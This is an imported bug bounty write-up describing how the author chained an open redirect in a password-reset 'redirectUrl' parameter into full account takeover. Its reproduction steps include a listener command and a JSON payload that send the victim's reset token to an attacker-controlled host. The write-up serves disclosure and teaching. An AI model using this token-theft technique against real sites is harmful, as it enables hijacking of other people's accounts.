---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-01-30_how-i-chained-p4-to-p2-open-redirection-to-full-account-takeover.md
original_filename: 2021-01-30_how-i-chained-p4-to-p2-open-redirection-to-full-account-takeover.md
title: How I chained P4 To P2 [Open Redirection To Full Account Takeover]
category: documents
detected_topics:
- password-reset
- oauth
- sqli
- command-injection
- otp
- csrf
tags:
- imported
- documents
- password-reset
- oauth
- sqli
- command-injection
- otp
- csrf
language: en
raw_sha256: 7313476a6dd4eb080caf2dfc369d075566f18b445f88f69ed41ac631eae857d6
text_sha256: 4c32d55a22ba6510fc52dfbb53327db60960085e477942a15270832088cbea43
ingested_at: '2026-06-28T07:32:04Z'
sensitivity: unknown
redactions_applied: false
---

# How I chained P4 To P2 [Open Redirection To Full Account Takeover]

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-01-30_how-i-chained-p4-to-p2-open-redirection-to-full-account-takeover.md
- Source Type: markdown
- Detected Topics: password-reset, oauth, sqli, command-injection, otp, csrf
- Ingested At: 2026-06-28T07:32:04Z
- Redactions Applied: False
- Raw SHA256: `7313476a6dd4eb080caf2dfc369d075566f18b445f88f69ed41ac631eae857d6`
- Text SHA256: `4c32d55a22ba6510fc52dfbb53327db60960085e477942a15270832088cbea43`


## Content

---
title: "How I chained P4 To P2 [Open Redirection To Full Account Takeover]"
page_title: "How I Chained P4 To P2 [Open Redirection To Full Account Takeover] | by Bishal Shrestha | InfoSec Write-ups"
url: "https://medium.com/bugbountywriteup/how-i-chained-p4-to-p2-open-redirection-to-full-account-takeover-a28b09a94bf7"
authors: ["Bishal Shrestha (@bishal0x01)"]
bugs: ["Open redirect", "Account takeover"]
publication_date: "2021-01-30"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3952
scraped_via: "browseros"
---

# How I chained P4 To P2 [Open Redirection To Full Account Takeover]

How I Chained P4 To P2 [Open Redirection To Full Account Takeover]
Bishal Shrestha
Follow
4 min read
·
Jan 30, 2021

506

3

Hello everyone,

I hope you are doing well. After a very long time, I am back with a new article about how I chained an open redirection vulnerability into a full Account Takeover (ATO). Let me share the story briefly. :P

I initially reported a “Token Leakage via Referer Response” vulnerability. After some time, the issue was resolved, so I decided to revisit it for verification. While testing again, I noticed an endpoint containing a redirectUrl parameter. During the fix, they had introduced a new parameter in the HTTP request.

I changed the redirectUrl value to google.com. However, while checking the email, I noticed that google.com was not directly injected into the mail content. But after opening the link, it successfully redirected me to google.com.

At first, I thought about reporting it immediately as an Open Redirection vulnerability. But then I wondered: Is it possible to chain this issue into something more impactful? If yes, it would definitely be more valuable to report.

Then I noticed that the redirectUrl= parameter was reflected together with the reset token. At that point, I decided to continue testing further.

This issue is somewhat similar to Host Header Injection and OAuth misconfiguration flaws, but in a different scenario. I believe this write-up may help someone identify similar vulnerabilities, so I decided to share it.

If I had reported it only as an Open Redirection issue, it would most likely have been classified as a P4 (Low Priority) bug on Bugcrowd.

About Open Redirection:

Unvalidated redirect vulnerabilities occur when an attacker is able to redirect users to an untrusted site through a trusted website. This vulnerability is commonly known as Open Redirect.

PortSwigger Lab:
https://portswigger.net/academy/labs/launch/67ab900d88bcd094478d14d157338de5bf87302c124c802219a8ef29a4a65e0f?referrer=%2fweb-security%2fdom-based%2fopen-redirection%2flab-dom-open-redirection

Steps to Reproduce This Issue:

First, I logged into:

https://redacted.vulnsite.com/login

Then I clicked on the Forgot Password option.

Press enter or click to view image in full size
UI of vulnerable website.
I opened Burp Suite to intercept the request. After clicking on Forgot Password and entering the victim’s email address, I sent the request to Repeater and modified it.
Before HTTP Request:

Then I opened a terminal and ran the following command to receive incoming requests:

python3 -m http.server 80

Next, I changed the request to:

{"redirectUrl":"http://127.0.0.1/?reset-result={0}&reset-callback-uri={1}"}
Changed redirectUrl to 127.0.0.1 in the HTTP request.
When the victim opened the password reset link, it redirected to:
http://127.0.0.1/Secret_reset_token
While checking the response, I successfully received the reset token.

At this point, I could reset the victim’s password simply by replacing the original reset URL:

https://redacted.vulnsite.com/Secret_reset_token

with the stolen reset token URL.

Get Bishal Shrestha’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

This allowed me to set a new password, ultimately leading to Full Account Takeover.

Press enter or click to view image in full size
Response from Bugcrowd ASE!

Since the issue was similar to Host Header Injection, the Bugcrowd Application Security Engineer reclassified the vulnerability accordingly in the VRT and provided some very helpful commentary! ❤ :)

A Few Takeaways From My Side:
Start hunting on Vulnerability Disclosure Programs (VDP) first (Hall of Fame, swag-based, or point-based programs with lower competition).
I strongly recommend learning different methodologies on VDP targets before moving into paid public programs. Jumping directly into public paid programs often results in duplicates or frustration due to high competition.
Invest time in understanding the platform itself.
Example: Bugcrowd may accept certain rate-limiting issues, while HackerOne may not (depending on the program policy).
Always read the program policy and scope carefully.
Create a personal testing checklist and apply it consistently.
Examples:
CSRF by changing POST to GET
SQL Injection on password reset functionality
Host Header Injection by modifying headers
Testing redirect-related parameters
Understand the real exploitation path and impact before reporting an issue.
After a vulnerability is fixed, always revisit it and look for bypasses.

Your feedback would be greatly appreciated and will motivate me to write more content like this.

Thank you for taking the time to read this article!
Happy hacking/hunting!

Connect with me:

Twitter:
https://twitter.com/bishal0x01

Instagram:
https://www.instagram.com/bishal0x01/

YouTube:
https://www.youtube.com/therbishal

References:

https://blog.detectify.com/2016/08/15/owasp-top-10-unvalidated-redirects-and-forwards-10/

https://portswigger.net/web-security/host-header
